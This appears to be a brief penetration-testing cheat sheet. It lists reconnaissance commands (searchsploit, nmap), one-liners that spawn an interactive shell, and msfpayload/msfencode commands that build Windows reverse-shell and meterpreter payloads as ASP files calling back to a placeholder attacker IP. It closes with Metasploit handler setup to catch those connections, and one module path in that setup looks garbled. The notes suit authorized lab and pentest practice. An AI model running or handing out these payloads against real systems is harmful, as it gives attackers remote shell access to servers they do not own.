* `searchsploit`
* `nmap -sV -sC <host address>`
* Spawning a TTY shell
  * `python -c 'import pty; pty.spawn("/bin/sh")'`
  * `echo os.system('/bin/bash')`
  * `/bin/sh -i`

```
Encoding windows reverse command shell as asp
msfpayload windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-nc-port> R | msfencode -t asp -o <filename>.asp
Encoding meterpreter in asp
msfpayload windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-multi-handler-port> R | msfencode -t asp -o <filename>.asp
------
attacker msfconsole:
use multi/exploit/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT <attacker-multi-handler-port>
exploit

```



